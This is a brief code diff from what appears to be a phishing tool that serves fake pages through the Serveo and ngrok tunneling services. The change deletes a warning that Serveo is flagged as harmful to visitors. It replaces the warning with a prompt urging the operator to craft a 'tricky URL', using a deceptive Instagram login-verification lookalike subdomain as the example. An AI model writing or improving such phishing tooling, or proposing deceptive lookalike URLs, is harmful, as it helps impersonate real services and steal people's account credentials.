@@ -105,7 +105,7 @@ def runNgrok():
             break
 
 def runServeo():
-    print(_("\n {0}[ BE CAREFUL ! SERVEO NOW TREATED AS HARMFUL FOR VISITORS ! STAY UPDATED !!]) \n\n\n {0}Insert a custom subdomain for serveo").format(RED, DEFAULT))
+    print(_("\n {0}[ YOU CAN MAKE A TRICKY URL LIKE ]  \n (http ://instagram.Login.Security.verification.serveo[.]net) \n\n\n {0}Insert a custom subdomain for serveo").format(RED, DEFAULT))
     lnk = input(_("\n {0}CUSTOM Subdomain>>> {1}").format(RED, DEFAULT))
     if not ".serveo.net" in lnk:
         lnk += ".serveo.net"
